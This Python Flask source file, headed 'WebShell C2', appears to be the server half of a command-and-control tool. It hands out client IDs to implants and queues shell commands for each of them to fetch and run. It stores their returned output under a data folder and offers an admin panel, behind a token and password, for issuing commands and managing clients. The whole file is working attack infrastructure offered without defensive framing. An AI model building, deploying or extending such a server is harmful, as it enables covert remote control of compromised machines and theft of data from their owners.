from flask import Flask, request, render_template
from suggest_lib import Suggested_pass
from multiprocessing import Process
import csv
import glob
import sys
import hashlib

def create_csv():
    with open('id_and_commands.csv', mode='w') as csv_file:
        fieldnames = ['id', 'command', 'status']
        writer = csv.DictWriter(csv_file, fieldnames=fieldnames)
        writer.writeheader()
        writer.writerow({'id': '0', 'command': 'ls -lah', 'status': 'Active'})

def get_id_command():
    with open('id_and_commands.csv', mode='r') as inp:
        reader = csv.reader(inp)
        return list(reader)[1:]

def remove_doublons():
    all = get_id_command()
    for i in get_id_command():
        while all.count(i)>1:
            all.pop(all.index(i))
    with open('id_and_commands.csv', mode='w') as csv_file:
        fieldnames = ['id', 'command', 'status']
        writer = csv.DictWriter(csv_file, fieldnames=fieldnames)
        writer.writeheader()
        for i in all:
            writer.writerow({'id': i[0], 'command': i[1], 'status': i[2]})

def remove_one(id):
    all = get_id_command()
    all_count = len(all)
    for index,i in enumerate(get_id_command()):
        if i[0] == id:
            all.pop(index)
    with open('id_and_commands.csv', mode='w') as csv_file:
        fieldnames = ['id', 'command', 'status']
        writer = csv.DictWriter(csv_file, fieldnames=fieldnames)
        writer.writeheader()
        for i in all:
            writer.writerow({'id': i[0], 'command': i[1], 'status': i[2]})
    if len(all)==all_count:
        return False
    else:
        return True

def hash(password,username):
    dk = hashlib.pbkdf2_hmac('sha256', bytes(password,'utf-8'), bytes(username,"utf-8"), 100000)
    return dk.hex()


global admin_hash
admin_hash = "8333f288eed13901e3ff2f249a2d2bb957025942bf3baf3305109cbaedceeb5b"

global admin_usr
admin_usr = "admin"

global host
host1 = "0.0.0.0"

global commands
commands = []

global token
admin_token = Suggested_pass(10,10,0)
admin_token = admin_token.generate()

global admin_password
admin_password = Suggested_pass(5,5,-1).generate()

global fail_counter
fail_counter = 0
#### Web app

global app
app = Flask(__name__)

@app.route('/')
def my_form():
    return "<body style='text-align:center;line-weight:100%;'><h1 style='text-align:center;'>WebShell C2</h1><a href='/account' style='width:100%;text-align:center;'>http://server/account/</a></body>"

@app.route("/get_id/")
def get_id():
    with open("id.txt",'r') as file:
        id = int(file.read())
        id += 1
    with open("id.txt","w") as file:
        file.write(str(id))
    remove_doublons()
    return str(id)

@app.route('/get_command/')
def get_cmd():
    remove_doublons()
    if request.args.get('id'):
        id = request.args.get('id')
        if id in [j[0] for j in get_id_command()]:
            for i in get_id_command():
                if id in i:
                    command = i[1]
            to_keep = []
            last_csv = get_id_command()
            for elem in last_csv:
                if request.args.get('id') not in elem:
                    to_keep.append(elem)
            with open('id_and_commands.csv', mode='w') as csv_file:
                fieldnames = ['id', 'command', 'status']
                writer = csv.DictWriter(csv_file, fieldnames=fieldnames)
                writer.writeheader()
                writer.writerow({'id': request.args.get('id'), 'command': '', 'status': 'Active'})
                for i in to_keep:
                    writer.writerow({'id': i[0], 'command': i[1], 'status': i[2]})
            return command
        else:
            last_csv = get_id_command()
            with open('id_and_commands.csv', mode='w') as csv_file:
                fieldnames = ['id', 'command', 'status']
                writer = csv.DictWriter(csv_file, fieldnames=fieldnames)
                writer.writeheader()
                writer.writerow({'id': request.args.get('id'), 'command': '', 'status': 'Active'})
                for i in last_csv:
                    writer.writerow({'id': i[0], 'command': i[1], 'status': i[2]})
                return ""
    else:
        return "Sepcify an id"

@app.route("/push_command/")
def push_command():
    if request.args.get('id') and request.args.get('data') and request.args.get('command'):
        if request.args.get('id') not in glob.glob("./data/*.*"):
            with open("./data/"+request.args.get('id'),'w') as file:
                file.write("")
        with open(f"./data/{request.args.get('id')}",'a') as file:
            file.write(f"WebSh-{request.args.get('id')}-$ {request.args.get('command')}\n{request.args.get('data')}\n\n")
        return "Done !"
    else:
        return "-"

@app.route(f'/get_all_clients/{admin_token}',methods=["GET","POST"])
def get_all():
    if request.method == "POST":
        id = request.values.get('id-text')
        if id=="" or id==" ":
            return render_template("interact.html",content=get_id_command(),error_code="Enter an ID !")
        try:
            if remove_one(id):
                code = "Done, client removed !"
            else:
                code = "Unable to locate the client !"
        except:
            code = "Error, unable to remove the client !"
        return render_template("interact.html",content=get_id_command(),error_code=code)
    else:
        if request.args.get('password'):
            if request.args.get('password') == admin_password:
                return render_template("interact.html",content=get_id_command())
            #return "".join([f"<label>{i[0]}</label><label> {i[1]}</label><label> {i[2]}</label><br/>" for i in get_id_command()])
            else:
                return "Wrong password"
        return "Specify a Password"

@app.route("/account/",methods=["GET","POST"])
def account():
    global host1
    global admin_hash
    global admin_password
    global admin_token
    global fail_counter
    global admin_usr
    if fail_counter == 3:
        return render_template("admin.html",error_code=f"Acces Blocked, max attempts excelled.")
    if request.method == "POST":
        user = request.values.get('username')
        password = request.values.get('password')
        if hash(password,user)==admin_hash and user == admin_usr:
            fail_counter = 0
            return f"<h1 style='text-align:center;'>Admin links</h1><strong>Command Pannel :</strong><p>http://{host1}/command/{admin_token}?password={admin_password}</p>"+f"<strong>Clients Pannel :</strong><p>http://{host1}/get_all_clients/{admin_token}?password={admin_password}</p>"
        else:
            fail_counter+=1
            return render_template("admin.html",error_code=f"Access Refused : {fail_counter}/3 attempts.")
    else:
        return render_template("admin.html")


@app.route("/command/"+admin_token)
def command_panel():
    remove_doublons()
    if request.args.get('password') and request.args.get('id') and request.args.get('command'):
        if request.args.get('password')==admin_password:
            command = request.args.get('command')
            if request.args.get('id') not in [i[0] for i in get_id_command()]:
                last_csv = get_id_command()
                to_keep = []
                for elem in last_csv:
                    if request.args.get('id') not in elem:
                        to_keep.append(elem)
                with open('id_and_commands.csv', mode='w') as csv_file:
                    fieldnames = ['id', 'command', 'status']
                    writer = csv.DictWriter(csv_file, fieldnames=fieldnames)
                    writer.writeheader()
                    writer.writerow({'id': request.args.get('id'), 'command': request.args.get('command'), 'status': 'Active'})
                    for i in to_keep:
                        writer.writerow({'id': i[0], 'command': i[1], 'status': i[2]})
            else:
                last_csv = get_id_command()
                for index,elem in enumerate(last_csv):
                    if request.args.get('id') in elem:
                        last_csv[index][1] = request.args.get('command')
                with open('id_and_commands.csv', mode='w') as csv_file:
                    fieldnames = ['id', 'command', 'status']
                    writer = csv.DictWriter(csv_file, fieldnames=fieldnames)
                    writer.writeheader()
                    for i in last_csv:
                        writer.writerow({'id': i[0], 'command': i[1], 'status': i[2]})
            return "Done !"
        else:
            return "Not a valid password"
    else:
        return "Please set a password, an id, and a command"

@app.route("/blank/")
def blank():
    return ""

def start_server():
    global app
    app.run(port=80,threaded=True,host=host1)

try:
    with open("id_and_commands.csv",'r') as file:
        file.read()
except:
    create_csv()
try:
    with open("id.txt",'r') as file:
        file.read()
except:
    with open("id.txt",'w') as file:
        file.write("0")

web_server = Process(target=start_server)
web_server.start()
